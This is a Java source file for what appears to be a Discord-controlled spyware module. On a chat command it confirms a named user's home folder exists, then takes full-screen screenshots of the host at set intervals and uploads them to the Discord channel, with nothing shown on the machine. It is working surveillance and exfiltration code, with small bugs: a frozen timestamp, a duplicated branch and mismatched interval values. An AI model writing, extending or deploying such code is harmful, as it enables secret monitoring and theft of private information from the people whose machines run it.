
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.utils.FileUpload;


public class Screenshots extends ListenerAdapter  {
Timer timer;
TimerTask task;
String amountOfTime;
File windows;
File linux;
File file;
Date cd = new Date();
SimpleDateFormat date = new SimpleDateFormat("MM/dd/yyyy");
SimpleDateFormat time = new SimpleDateFormat("hh:mm:ss");
	public void onMessageReceived(MessageReceivedEvent e)
	{
		String[] msg = e.getMessage().getContentRaw().split("\\s+");
		
		if(msg[0].equalsIgnoreCase(".ss") && msg[1].equalsIgnoreCase("start"))
		{
			windows = new File("C:\\Users\\"+msg[2]);
			linux = new File("/home/"+msg[2]);
			amountOfTime = msg[3];
			timer = new Timer();
			task = new TimerTask()
					
			
					{
						@Override
						public void run()
						{
							try
							{
								
									
								BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
								ImageIO.write(image, "png", new File("screenshot.png"));
								file = new File("screenshot.png");
							
								EmbedBuilder eb = new EmbedBuilder();
								eb.setTitle(msg[2]+" ["+time.format(cd)+" - "+date.format(cd)+"]");
								eb.setImage("attachment://screenshot.png");
									
								if(windows.exists())
								{
									e.getChannel().sendMessageEmbeds(eb.build())
										.addFiles(FileUpload.fromData(file, "screenshot.png"))
											.queue();
								}else if(linux.exists())
									{
										e.getChannel().sendMessageEmbeds(eb.build())
											.addFiles(FileUpload.fromData(file, "screenshot.png"))
												.queue();
									}
							
									file.delete();
								}catch(Exception t)
								{
									t.printStackTrace();
								}
						}
					};
			if(amountOfTime.equalsIgnoreCase("5s"))
			{
				timer.scheduleAtFixedRate(task, 0, 5_000);
			}
			else if(amountOfTime.equalsIgnoreCase("10s"))
			{
				timer.scheduleAtFixedRate(task, 0, 10_000);
			}else if(amountOfTime.equalsIgnoreCase("20s"))
			{
				timer.scheduleAtFixedRate(task, 0, 20_000);
			}else if(amountOfTime.equalsIgnoreCase("30s"))
			{
				timer.scheduleAtFixedRate(task, 0, 30_000);
			}else if(amountOfTime.equalsIgnoreCase("1"))
			{
				timer.scheduleAtFixedRate(task, 0, 60_000);
			}else if(amountOfTime.equalsIgnoreCase("2"))
			{
				timer.scheduleAtFixedRate(task, 0, 120_000);
			}else if(amountOfTime.equalsIgnoreCase("3"))
			{
				timer.scheduleAtFixedRate(task, 0, 180_000);
			}else if(amountOfTime.equalsIgnoreCase("3"))
			{
				timer.scheduleAtFixedRate(task, 0, 240_000);
			}else if(amountOfTime.equalsIgnoreCase("4"))
			{
				timer.scheduleAtFixedRate(task, 0, 300_000);
			}else if(amountOfTime.equalsIgnoreCase("5"))
			{
				timer.scheduleAtFixedRate(task, 0, 360_000);
			}else
			{
				e.getChannel().sendMessage(".ss start *username* *time*").queue();
			}
			
			
			
			
			
		}else if(msg[0].equalsIgnoreCase(".kill"))
		{
			timer.cancel();
		}
			
		
			
					
		
	}

}
